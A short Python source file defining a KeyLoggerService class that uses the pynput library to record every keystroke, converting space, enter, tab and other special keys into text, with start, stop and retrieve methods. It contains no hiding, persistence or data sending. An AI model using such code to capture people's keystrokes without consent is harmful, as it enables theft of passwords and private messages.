from pynput.keyboard import Listener, Key

class KeyLoggerService:
    def __init__(self):
        self.keys = []
        self.listener = None

    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            if key == Key.space:
                self.keys.append(' ')
            elif key == Key.enter:
                self.keys.append('\n')
            elif key == Key.tab:
                self.keys.append('\t')
            else:
                self.keys.append(f"[{key.name}]")

    def start_logging(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        keys = self.keys[:]
        self.keys = []
        return keys